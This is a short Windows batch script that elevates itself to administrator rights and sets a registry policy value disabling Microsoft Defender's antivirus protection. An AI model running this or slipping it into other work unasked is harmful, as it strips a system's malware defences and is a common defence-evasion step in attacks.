@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
timeout 10